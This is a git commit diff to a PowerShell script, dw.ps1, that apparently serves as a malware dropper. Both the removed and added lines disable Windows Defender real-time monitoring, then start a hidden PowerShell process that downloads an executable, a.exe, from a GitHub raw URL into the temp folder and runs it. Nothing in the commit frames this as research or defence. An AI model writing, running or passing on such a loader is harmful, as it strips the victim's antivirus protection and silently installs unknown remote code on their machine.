05c6c889e3fcb8c7701a1b9953a8ea40ced22dcc
Sxcrate <88933467+sxcrate@users.noreply.github.com>
2024-04-17 12:23:33 +0200

    Update dw.ps1

--- dw.ps1
+++ dw.ps1
@@ -1,1 +1,2 @@
-Set-MpPreference -DisableRealtimeMonitoring $true; Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'; Start-Process -FilePath '.\a.exe'; exit" -WindowStyle Hidden; exit
+Set-MpPreference -DisableRealtimeMonitoring $true
+Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'; Start-Process -FilePath '.\a.exe'; exit" -WindowStyle Hidden; exit
